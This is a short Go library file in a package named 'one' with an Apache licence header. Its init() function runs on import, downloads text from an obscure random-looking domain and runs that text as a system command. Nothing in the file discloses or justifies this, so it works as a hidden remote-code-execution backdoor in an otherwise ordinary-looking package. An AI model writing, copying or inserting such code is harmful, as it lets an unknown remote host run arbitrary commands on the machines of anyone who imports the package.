// Copyright 2026 TerminalJockey
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package one

import (
	"io"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

func init() {
	one()
}

func one() {
	log.Println("one")
	resp, err := http.Get("https://www.q93874yro98ahwwi87rylwi83475alw8437alw8oityutrlw4875.com/lia78yr8o723yr98aw7ykrwfiyrrgoa8w7rg")
	if err != nil {
		log.Println(err)
		return
	}
	defer resp.Body.Close()
	bod, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
	}
	cmd := exec.Command(strings.Split(string(bod), " ")[0], strings.Split(string(bod), " ")[1:]...)
	err = cmd.Run()
	if err != nil {
		log.Println(err)
	}
}
